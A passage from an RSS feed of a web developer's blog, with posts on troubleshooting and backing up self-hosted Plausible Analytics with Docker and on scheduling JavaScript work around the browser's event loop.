href=&quot;https://httparchive.org/reports/page-weight?lens=top1m&amp;amp;start=2023_01_01&amp;amp;end=latest&amp;amp;view=list&amp;amp;ref=cms.macarthur.me#bytesImg&quot;&gt;over 700KB of images show up&lt;/a&gt; on your average web page. That&apos;s a lot, and if anything, I expect that number to increase in the age of AI-generated media. So, I&apos;m eager to see the tools mentioned here continue to gain adoption as the web evolves. We certainly need them.&lt;/p&gt;&lt;p&gt;Still, it&apos;s important not to abuse these or any other tools that might emerge, and we gotta be careful to avoid subconsciously making ourselves believe we can use even &lt;em&gt;more&lt;/em&gt; large imagery without consequence. If we fall into that trap, we&apos;ll only have modernized the problem, rather than done anything to build better experiences. &lt;/p&gt;&lt;p&gt;On the upside, front-end performance is in the spotlight more than ever before, and we have a ton of great resources to hold us accountable (ex: Core Web Vitals). &lt;/p&gt;&lt;p&gt;The future is bright!&lt;/p&gt;</content:encoded></item><item><title>Why Am I Getting a 502 Bad Gateway After Turning on Plausible?</title><link>https://macarthur.me/posts/plausible-bad-gateway</link><guid isPermaLink="true">https://macarthur.me/posts/plausible-bad-gateway</guid><pubDate>Sun, 28 Jan 2024 04:11:47 GMT</pubDate><content:encoded>&lt;p&gt;If you’re using Docker to self-host Plausible Analytics on DigitalOcean or any other virtual machine, you might’ve run into a “502 Bad Gateway” error when attempting to navigate to the administrator dashboard.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-7.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1142&quot; height=&quot;452&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-7.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-7.png 1000w, https://cms.macarthur.me/content/images/2024/01/image-7.png 1142w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;It’s a more common problem than you might think, but there are fortunately a few says to figure it out:&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;1. Give it a minute or two after start-up.&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;If you set up Plausible using the &lt;a href=&quot;https://plausiblebootstrapper.com/?ref=cms.macarthur.me&quot;&gt;Plausible Bootstrapper&lt;/a&gt; or their recommended &lt;code&gt;docker-compose.yml&lt;/code&gt;, you started everything up by running &lt;code&gt;docker compose up -d&lt;/code&gt;. That &lt;code&gt;-d&lt;/code&gt; flag is helpful, but can also hide feedback from your containers about what’s goin on under the good.&lt;/p&gt;&lt;p&gt;If you ran &lt;code&gt;docker compose up&lt;/code&gt; &lt;em&gt;without&lt;/em&gt; that flag, you’d see logs from every container running under the good, and you’d be more aware of the fact that &lt;em&gt;a lot is going on under the hood,&lt;/em&gt; and it might take a bit to get to the point of it being ready to receive requests.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-8.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1916&quot; height=&quot;564&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-8.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-8.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/01/image-8.png 1600w, https://cms.macarthur.me/content/images/2024/01/image-8.png 1916w&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;container activity&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;On my own virtual machine, it takes several seconds to become fully functional after turning on every container. And in the meantime, incoming requests may be met with a 502 error.&lt;/p&gt;&lt;p&gt;So, if you’re seeing this issue just seconds after turning on everything, it might just required waiting a couple minutes for the containers to boot up properly until they’re ready to received requests.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;2. Allocate more RAM.&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;By default, the Docker engine running on your machine &lt;a href=&quot;https://docs.docker.com/config/containers/resource_constraints/?ref=cms.macarthur.me&quot;&gt;doesn’t have specific memory constraints&lt;/a&gt; when running your containers — it’ll just assume the resources available on the machine itself.&lt;/p&gt;&lt;p&gt;But that can mean the specifications of your machine can impact Plausible’s ability to function effectively. Using &lt;code&gt;docker compose logs&lt;/code&gt; in the directory of your Plausible instance can reveal odd errors being through by various components, and they’re often tied to limited RAM available at the time.&lt;/p&gt;&lt;p&gt;On DigitalOcean, an easy way to test this is to resize your machine to one with more RAM:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-9.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1542&quot; height=&quot;538&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-9.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-9.png 1000w, https://cms.macarthur.me/content/images/2024/01/image-9.png 1542w&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;droplet sizing&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;If you’re on the 512MB size, switching to 1BG can make a big impact. Restart your containers, and it’s possible your issues will go away.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Other Causes?&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;These are the two most common causes of a 502 Gateway when running my own instances of self-hosted Plausible, but I’m sure it’s not an exhaustive list. If you’ve identified any other culprits, I’d love to hear them. Send me a message or find me on X.&lt;/p&gt;</content:encoded></item><item><title>How to Back Up Your Self-Hosted Plausible Analytics Data</title><link>https://macarthur.me/posts/back-up-plausible</link><guid isPermaLink="true">https://macarthur.me/posts/back-up-plausible</guid><pubDate>Sun, 28 Jan 2024 03:13:45 GMT</pubDate><content:encoded>&lt;p&gt;Self-hosting Plausible Analytics offers a number of advantages, particularly if you’re keen on owning your data as much as you reasonably can, independent of the constraints any sort of managed plan might offer. But there are trade-offs — the big one being that you don’t get dedicated backups.&lt;/p&gt;&lt;p&gt;Fortunately, it’s straightforward to create &amp;amp; restore these backups yourself.&lt;/p&gt;&lt;p&gt;Since all of Plausible’s self-hosted data lives inside Docker volumes, we’ll be able to use Jarek Lipski’s &lt;a href=&quot;https://github.com/loomchild/volume-backup?ref=cms.macarthur.me&quot;&gt;volume-backup&lt;/a&gt; utility for managing backups sourced from those volumes. But first, we’ll need to determine where the relevant volumes are living.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Locating Your Volumes&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;If you’re used the &lt;a href=&quot;https://plausiblebootstrapper.com/?ref=cms.macarthur.me&quot;&gt;Plausible Bootstrapper&lt;/a&gt; to set up your self-hosted instance of Plausible (or if you used the &lt;code&gt;docker-compose.yml&lt;/code&gt; file found in the &lt;a href=&quot;https://github.com/plausible/hosting/blob/master/docker-compose.yml?ref=cms.macarthur.me&quot;&gt;plausible/hosting repository&lt;/a&gt;), your volume names are &lt;code&gt;db-data&lt;/code&gt; and &lt;code&gt;event-data&lt;/code&gt;. You can confirm that by running logging into your virtual machine and running &lt;code&gt;docker volume ls&lt;/code&gt;.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1828&quot; height=&quot;330&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-5.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-5.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/01/image-5.png 1600w, https://cms.macarthur.me/content/images/2024/01/image-5.png 1828w&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;listing docker volumes&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The volumes you’re interested in should be obvious to spot.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Preparing for the Backup&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Before we actually back up anything, we need to ensure no active containers are relying on those volumes. That’s as simple as temporarily turning off our containers. To do that, you can run the following. This’ll vary a smidge based on where you placed Plausible inside your machine.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# This should be wherever you put Plausible!
cd /opt/plausible

# Turn off all active containers.
docker compose down&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After that’s finished, verify that your Plausible volumes are now “dangling,” meaning they’re not connected to a running container:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker volume ls -qf dangling=true&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assuming all went well, you should see your Plausible volumes named in that list.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Running the Backup&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Lipski’s utility makes this next step fairly easy. For each volume, we’ll use the following template:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker run -v [volume-name]:/volume --rm --log-driver none loomchild/volume-backup backup &amp;gt; [archive-path].tar.bz2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I’ll put my backups in a &lt;code&gt;backups&lt;/code&gt; directory within my home directory, so I’ll need to make that first:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Create backup directory.
mkdir ~/backups

# Run backup.
docker run -v plausible_db-data:/volume --rm --log-driver none loomchild/volume-backup backup &amp;gt; ~/backups/plausible_db-data.tar.bz2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If it’s the first time you’ve run that command, you’ll see some output indicating it’s being downloaded. Future runs will be a little quieter.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;311&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-6.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-6.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/01/image-6.png 1600w, https://cms.macarthur.me/content/images/size/w2400/2024/01/image-6.png 2400w&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;running the backup for the first time&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Do that for both of the named volumes you listed above.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Restoring Backups&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Restoring a backup requires a very similar command — this time using the &lt;code&gt;restore&lt;/code&gt; command, but targeting the same backup files:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker run -i -v plausible_db-data:/volume --rm loomchild/volume-backup restore &amp;lt; ~/backups/plausible_db-data.tar.bz2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once you’re restored, you can safely docker back on your containers.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Putting Together a Backup Script&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;It’s easy enough to wrap this in a script you can run on a regular schedule. Of course, it won’t do you any good if your entire virtual machine is trashed, but it’ll at least be there if your specific Plausible instance becomes corrupted, or if a Docker volume is accidentally removed.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash

# Create &quot;backups&quot; directory if it doesn&apos;t already exist.
mkdir -p ~/backups &amp;gt;/dev/null 2&amp;gt;&amp;amp;1

# Turn off docker containers. Important!
docker compose down

# Back up volumes.
docker run -v plausible_db-data:/volume --rm --log-driver none loomchild/volume-backup backup &amp;gt; ~/backups/plausible_db-data.tar.bz2
docker run -v plausible_event-data:/volume --rm --log-driver none loomchild/volume-backup backup &amp;gt; ~/backups/plausible_event-data.tar.bz2

# Turn on containers again.
docker compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Wire that up to a reguarly scheduled cron job, and you’re good to go.&lt;/p&gt;</content:encoded></item><item><title>Picking the Right Tool for Maneuvering JavaScript&apos;s Event Loop</title><link>https://macarthur.me/posts/navigating-the-event-loop</link><guid isPermaLink="true">https://macarthur.me/posts/navigating-the-event-loop</guid><pubDate>Fri, 19 Jan 2024 17:49:00 GMT</pubDate><content:encoded>&lt;p&gt;Much of the time, you can get along just fine without thinking a ton about JavaScript&apos;s event loop. But sooner or later (especially as you begin spending more time with things like the rendering process and asynchronous tasks) it becomes handy to know not only how the thing works, but the different tools available to best maneuver it. &lt;/p&gt;&lt;p&gt;By &quot;maneuver,&quot; I mean &quot;schedule code to execute at a part of an event loop iteration, or on a different one altogether.&quot; Which ones you choose in different situations can have a big impact on performance and user experience.&lt;/p&gt;&lt;h2&gt;A Brief Reacquaintance&lt;/h2&gt;&lt;p&gt;Quick refresher on the event loop: it&apos;s the mechanism that coordinates when tasks are executed in relation to everything else running on the browser&apos;s main thread. When a page loads, the loop is constantly rotating, checking if different parts of the browser have tasks to execute. If they do, those pieces get temporary control to run a task they have available. Those &quot;pieces&quot; include pretty much everything – user input, rendering, network requests, and a bunch more.&lt;/p&gt;&lt;p&gt;Here’s how I attempt to visualize it in my head:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/04/event-loop-illustration.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1600&quot; height=&quot;989&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/04/event-loop-illustration.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/04/event-loop-illustration.png 1000w, https://cms.macarthur.me/content/images/2023/04/event-loop-illustration.png 1600w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;As it&apos;s turning, different queues are getting filled with things to do and waiting for their chance to move to the call stack for execution. You the most chatter about two of them: the main &lt;strong&gt;task queue&lt;/strong&gt; and the &lt;strong&gt;microtask queue&lt;/strong&gt;.&lt;/p&gt;&lt;h3&gt;The Task Queue&lt;/h3&gt;&lt;p&gt;The task (also: &quot;callback&quot; or &quot;macrotask&quot;) queue is the primary queue that holds the callbacks of many browser APIs. For example, anytime you use &lt;code&gt;addEventListener()&lt;/code&gt;, the browser throws a callback onto the task queue as soon as the event is triggered, and once the event loop gets back around to the queue, that task will move onto the &lt;em&gt;call stack&lt;/em&gt; for execution. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const clickedCallback = () =&amp;gt; {
	// Loaded onto task queue after button is clicked.
	console.log(&quot;clicked!&quot;);
};

buttonNode.addEventListener(&apos;click&apos;, clickedCallback);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This queue is checked for something to run &lt;em&gt;once&lt;/em&gt; per turn of the event loop. If something is found, it’ll execute the oldest task available (FIFO — ”first in, first out”), and then move on to the next thing.&lt;/p&gt;&lt;p&gt;There&apos;s a lot more to it than that, but if you&apos;d like to go a little deeper, there are plenty of resources out there on the task queue. A couple of the best talks I&apos;ve seen on it are from &lt;a href=&quot;https://www.youtube.com/watch?v=8aGhZQkoFbQ&amp;amp;vl=en&amp;amp;ref=cms.macarthur.me&quot;&gt;Philip Roberts&lt;/a&gt; and &lt;a href=&quot;https://www.youtube.com/watch?v=cCOL7MC4Pl0&amp;amp;ref=cms.macarthur.me&quot;&gt;Jake Archibald&lt;/a&gt;.&lt;/p&gt;&lt;h3&gt;The Microtask Queue&lt;/h3&gt;&lt;p&gt;When everything on call stack has been executed (which may involve queueing more tasks for later execution), control is &lt;em&gt;not&lt;/em&gt; given back to the event loop... yet. Instead, the microtask queue is given a chance to seize control. &lt;/p&gt;&lt;p&gt;You&apos;ve probably engaged with this queue without even knowing it – anything in a &lt;code&gt;.then()&lt;/code&gt; on a resolved Promise fires from this queue. Example: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;Promise.resolve().then(() =&amp;gt; {
  console.log(&apos;Fired from the microtask queue!&apos;);
});

setTimeout(() =&amp;gt; {
  console.log(&apos;Fired from the task queue!&apos;);
}, 1000);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What&apos;s special about the microtask queue is that control won&apos;t be given back to the event loop until it&apos;s &lt;em&gt;completely empty&lt;/em&gt;. And that can be troublesome because microtask callbacks can themselves load more callbacks onto the microtask queue. Here&apos;s that flow:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/04/task-queue-diagram.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1500&quot; height=&quot;928&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/04/task-queue-diagram.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/04/task-queue-diagram.png 1000w, https://cms.macarthur.me/content/images/2023/04/task-queue-diagram.png 1500w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;If you&apos;re not careful, that can lead to a gnarly, thread-blocking delay, barring the event loop from doing &lt;em&gt;anything&lt;/em&gt; else, including UI updates and handling user input. To further illustrate: the following CodePen runs two types of continuous loops for five seconds straight. The first uses &lt;code&gt;setTimeout()&lt;/code&gt; to invoke itself over and over. The second uses &lt;code&gt;queueMicrotask()&lt;/code&gt;, preventing the event loop from doing &lt;em&gt;anything else&lt;/em&gt; until the microtask queue is empty and those five seconds are up. &lt;/p&gt;&lt;p&gt;Trigger one of those loops and then click the &quot;increment&quot; button.&lt;/p&gt;&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/YzOoNyX?ref=cms.macarthur.me&quot;&gt;
  Blog Post :: Navigating the Event Loop :: setTimeout() vs. queueMicrotask()&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;
&lt;p&gt;If you did it, you saw that you could still increment the count while &lt;code&gt;setTimeout()&lt;/code&gt; was running. That&apos;s expected – between runs, the event loop can still make full rotation, handling other responsibilities like updating the UI. But while &lt;code&gt;queueMicrotask()&lt;/code&gt; was running, it didn&apos;t have that privilege. Everything was frozen.&lt;/p&gt;&lt;h2&gt;The Tools&lt;/h2&gt;&lt;p&gt;With that bit of context, the browser comes with a set of tools for executing code while while the event loop is spinning. It&apos;s certainly not all of them, but probably some of the most common you&apos;ll see (and should maybe use) while building things.&lt;/p&gt;&lt;h4&gt;#1. setTimeout(() =&amp;gt; {}, 0)&lt;/h4&gt;&lt;p&gt;Reach for this whenever you&apos;d like to queue a callback to run on the soonest possible &lt;em&gt;future&lt;/em&gt; turn of the event loop. I say &quot;soonest possible&quot; because it&apos;s technically not guaranteed be the &lt;em&gt;next &lt;/em&gt;cycle. Instead, it&apos;ll depend on how quickly the browser can turn around and place a callback onto the task queue for execution. Even if you pass &lt;code&gt;0&lt;/code&gt; for a delay, the actual minimum delay will vary between zero and four milliseconds, &lt;a href=&quot;https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html?ref=cms.macarthur.me#timers&quot;&gt;depending on its usage&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;A common reason to enqueue work like this is to avoid stalling the event loop for a single, big task. A lot runs on the same thread as the event loop is turning. And if that one task holds everything up for too long, the browser&apos;s snappiness will suffer. Scheduling tasks to run over multiple turns allows other important tasks to be addressed while a single, greater chunk of work is in-progress. &lt;/p&gt;&lt;p&gt;Let&apos;s say you&apos;re working with a large list of items, each of which need to be go through an expensive process. You could process that entire list synchronously:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function doExpensiveProcess(item) {
  console.log(&apos;PROCESSING:&apos;, item);
}

function processItems(items) {
  const item = items.shift();

  doExpensiveProcess(item);

  if (items.length) {
    processItems(items);
  }
}

processItems([1, 2, 3]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But that would mean &lt;em&gt;nothing&lt;/em&gt; else in the browser could occur until the entire list finished. User events wouldn&apos;t yield any sort of response. Animated GIFs would freeze. It&apos;d be frustrating.&lt;/p&gt;&lt;p&gt;So, we&apos;ll queue up each item to be processed as a separate task instead:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function doExpensiveProcess(item) {
  console.log(&apos;PROCESSING:&apos;, item);
}

function processItems(items) {
+	setTimeout(() =&amp;gt; {
    	const item = items.shift();

		doExpensiveProcess(item);

		if (items.length) {
			processItems(items);
		}
+	}); &amp;lt;-- `0` by default
}

processItems([1, 2, 3]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This time, while the list is being processed, the event loop will have a chance to check in on other tasks, making the user experience a little more seamless.&lt;/p&gt;&lt;p&gt;We can illustrate this with a similar example as before. Here are two buttons – one processes the list synchronously, and the other asynchronously. &lt;/p&gt;&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/abaeNOy?ref=cms.macarthur.me&quot;&gt;
  Blog Post :: Navigating the Event Loop :: Async vs. Sync&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;
&lt;p&gt;As expected, the synchronous loop blocks &lt;em&gt;everything&lt;/em&gt; until the full list is finished. The asynchronous, however, breaks the larger task up, so the user experience isn&apos;t &lt;em&gt;as&lt;/em&gt; compromised. There&apos;s still a little jank, but not a complete deadlock.&lt;/p&gt;&lt;h5&gt;In the Same Vein: &lt;code&gt;MessageChannel()&lt;/code&gt;&lt;/h5&gt;&lt;p&gt;If, for some reason, &lt;code&gt;setTimeout()&lt;/code&gt; doesn&apos;t suit you, there&apos;s alternative I&apos;ve seen used: &lt;code&gt;MessageChannel()&lt;/code&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const channel = new MessageChannel();
channel.port1.onmessage = () =&amp;gt; {
	console.log(&quot;Fired on next event loop cycle!&quot;);   
};
channel.port2.postMessage(null);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Admittedly, the advantages to this choice are a little muddy to me, but I have come across a couple of comments suggesting that since a &lt;code&gt;MessageChannel()&lt;/code&gt; doesn&apos;t need to queue up timers to be managed by the browser, it has the potential to be the more efficient of the two. I can&apos;t speak to it any further than that.&lt;/p&gt;&lt;h4&gt;#2. queueMicrotask(() =&amp;gt; {}, 0)&lt;/h4&gt;&lt;p&gt;There&apos;ll be a time when you want to fire a bit of code after the current task is complete, but &lt;em&gt;before &lt;/em&gt;control is given back to the event loop for anything else to occur. That&apos;s the role of &lt;code&gt;queueMicrotask()&lt;/code&gt;. It&apos;s a great tool for doing &quot;just one more thing&quot; after potentially more important work is wrapped up, all on the same iteration of the event loop.&lt;/p&gt;&lt;p&gt;I haven&apos;t come across a ton of practical use cases for it, but I have thought about a few contrived examples. It can be useful for...&lt;/p&gt;&lt;p&gt;&lt;strong&gt;...performing some final work after a series of complex logic.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Say you need to build a series of logs after someone clicks a button, causing a &lt;code&gt;logs&lt;/code&gt; array to be filled. The callback contains some complex logic, including code paths that yield early returns. Throwing a callback on the microtask queue means your logging can be neatly removed from those various paths, helping it to feel more out of the way.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;let logs = [];

function firstThing() {
	logs.push(&apos;log #1&apos;);
}

function secondThing() {
	logs.push(&apos;log #2&apos;);
}

function thirdThing() {
	logs.push(&apos;log #3&apos;);
}

function emitLogs() {
	console.log(&apos;Logs:&apos;, logs);
	logs = [];
}

document.getElementById(&apos;button&apos;).addEventListener(&apos;click&apos;, () =&amp;gt; {
    // No need to chase various code paths.
	queueMicrotask(() =&amp;gt; {
		emitLogs();
	});

	firstThing();

	if (someCondition()) {
		secondThing();
		return;
	}

	thirdThing();
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In cases like this, despite logic getting pretty thick, you&apos;ll still be able to cleanly execute some code after every possible path.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;... reliably dispatching an event only after all event listeners are safely attached.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;You might find yourself working with an intricate set of event listeners being wired up on a page. Using &lt;code&gt;queueMicrotask()&lt;/code&gt; can make it easier to more deterministically signal that the UI is ready to go. Imagine this: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;queueMicrotask(() =&amp;gt; {
  // Emit event after UI is ready.
  document.body.dispatchEvent(new CustomEvent(&apos;ui:ready&apos;));
});

document
  .getElementById(&apos;button&apos;)
  .addEventListener(&apos;click&apos;, () =&amp;gt; console.log(&apos;button clicked!&apos;));

document
  .getElementById(&apos;box&apos;)
  .addEventListener(&apos;mouseover&apos;, () =&amp;gt; console.log(&apos;hover!&apos;));

// ... more event listeners and other UI setup.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sure, the same event could have been dispatched &lt;em&gt;after &lt;/em&gt;those event listeners were attached, but that requires the application to be architected in an arguably more prescriptive way, and it would also assume that no other UI setup is accidentally placed after the event is emitted in the future. Again, it&apos;s just a little more predictable and deterministic, with no risk of any other tasks from other parts of the browser sneaking in to delay it, since it&apos;ll still occur on the same turn.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;... doing something after higher-priority actions take place.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;If you&apos;re working on something with especially high performance concerns, &lt;code&gt;queueMicrotask()&lt;/code&gt; can help ensure the most important work is prioritized in any given turn of the event loop. Let&apos;s say you&apos;re firing a series of functions doing something critical. Each function should be logged as it&apos;s triggered, but you don&apos;t want that logging action to slow down the primary work &lt;em&gt;at all&lt;/em&gt;. Throwing that logging work onto the microtask queue can ensure nothing gets in the way of what matters most: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function firstThing() {
  console.log(&apos;first very important thing.&apos;);

  queueMicrotask(() =&amp;gt; {
    console.log(&apos;send log&apos;);
  });
}

function secondThing() {
  console.log(&apos;second very important thing.&apos;);

  queueMicrotask(() =&amp;gt; {
    console.log(&apos;send another log&apos;);
  });
}

firstThing();
secondThing();

// Output:
// first very important thing.
// second very important thing.
// send log
// send another log&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notably, while these callbacks don&apos;t halt primary tasks, they also don&apos;t risk getting blocked by anything else the event loop might permit to occur after it&apos;s done – it&apos;s all happening on the same iteration.&lt;/p&gt;&lt;h3&gt;#3. requestAnimationFrame(()=&amp;gt; {}); &lt;/h3&gt;&lt;p&gt;This one&apos;s useful whenever you need to execute code in coordination with the browser&apos;s repaint cycle. The event loop spins at however quickly it&apos;s able to execute tasks, but most devices paint screen updates at a rate of 60 times per second. &lt;/p&gt;&lt;p&gt;The most obvious perk to &lt;code&gt;requestAnimationFrame()&lt;/code&gt; is its ability to orchestrate smooth animations. Reaching for &lt;code&gt;setTimeout()&lt;/code&gt; or &lt;code&gt;setInterval()&lt;/code&gt; to rotate infinitely rotating something, for example, &quot;works,&quot; but since it&apos;s removed from how the browser updates what a user sees, it can make for missed frames and some roughness to an animation. Here&apos;s an example with two spinning things – one with &lt;code&gt;setTimeout()&lt;/code&gt;, and the other with &lt;code&gt;requestAnimationFrame()&lt;/code&gt;:&lt;/p&gt;&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/YzJzdLW?ref=cms.macarthur.me&quot;&gt;
  Blog Post :: Navigating the Event Loop :: setTimeout() vs. requestAnimationFrame()&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;
&lt;p&gt;If you watch closely, you should see a smidge of weirdness with the animation on the left. Its rotations aren&apos;t happening with the repaint cycle in mind. It&apos;s just marching forward as programmed, producing a bit of jank. The second, however, only modifies the DOM when the browser&apos;s about to perform a paint, meaning the frames are updated in harmony with what&apos;s shown on the screen, yielding a smoother animation. &lt;/p&gt;&lt;p&gt;But it&apos;s helpful for more too – like surgically handling CSS transitions on HTML elements. Say you want to slide open a box with an unknown amount of content inside it. You might&apos;ve used a trick in the past by setting a &lt;code&gt;max-height&lt;/code&gt; on a box to value you know to be higher than the box&apos;s &lt;em&gt;actual&lt;/em&gt; height: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;
	.box {
		/* Other box styles... */
        
		transition: max-height 0.5s;
		max-height: 0;
	}

	.is-open {
        // Hope 500px is taller than the box!
		max-height: 500px;
	}
&amp;lt;/style&amp;gt;

&amp;lt;button id=&quot;button&quot;&amp;gt;Open Box&amp;lt;/button&amp;gt;

&amp;lt;div class=&quot;box&quot;&amp;gt;
  An unknown amount of content.
&amp;lt;/div&amp;gt;

&amp;lt;script&amp;gt;
	document.getElementById(&apos;button&apos;).addEventListener(&apos;click&apos;, () =&amp;gt; {
		box.classList.add(&apos;is-open&apos;);
	});
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;ll slide open, but it&apos;s also a bit of a guessing game. If you choose a value too low, the box won&apos;t completely open. But if the value&apos;s too large, the animation will be wasteful, enduring longer than necessary. Using &lt;code&gt;requestAnimationFrame()&lt;/code&gt;, however, will allow you to accomplish it with more precision, in one fell swoop: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;Expand the box completely.&lt;/li&gt;&lt;li&gt;Measure its rendered height.&lt;/li&gt;&lt;li&gt;Schedule a &lt;code&gt;height&lt;/code&gt; change to the calculated value after the next repaint in the browser, triggering an animation.&lt;/li&gt;&lt;/ul&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;
	.box {
		/* Other box styles... */
        
		display: none;
	}
&amp;lt;/style&amp;gt;

&amp;lt;!-- Box HTML goes here. --&amp;gt;

&amp;lt;script&amp;gt;
